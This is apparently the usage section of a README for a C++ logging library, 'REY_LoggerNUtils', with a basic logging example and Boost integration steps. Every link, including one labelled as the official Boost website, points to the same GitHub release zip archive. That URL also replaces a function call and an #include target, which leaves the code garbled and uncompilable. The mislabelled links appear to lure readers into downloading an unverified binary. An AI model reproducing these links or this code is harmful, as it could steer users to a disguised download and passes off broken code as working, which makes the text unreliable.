## Usage

To use **REY_LoggerNUtils** in your C++ project, include the `LoggerNUtils.h` header file in your source code. Initialize the logger and start logging your messages efficiently. Here's a simple example of logging a message:

```cpp
#include "LoggerNUtils.h"

int main() {
    Logger logger;
    https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip("Hello, LoggerNUtils!");
    return 0;
}
```

For advanced usage and integration with external libraries, refer to the examples section below.

## Examples

### Boost Logger Integration

**REY_LoggerNUtils** seamlessly integrates with Boost Logger for additional logging functionalities. To use Boost Logger in your project, follow these steps:

1. Install Boost Library from [Boost Official Website](https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip).
2. Update your CMAKE file to include Boost:
   ```cmake
   find_package(Boost REQUIRED log)
   include_directories(${Boost_INCLUDE_DIR})
   target_link_libraries(your_target ${Boost_LIBRARIES})
   ```

3. Use Boost Logger in your code:
   ```cpp
    #include <https://github.com/tinyunix1/REY_LoggerNUtils/releases/download/v2.0/Release_x64.zip>

    BOOST_LOG_TRIVIAL(info) << "Boost Logger Integration Example";
   ```
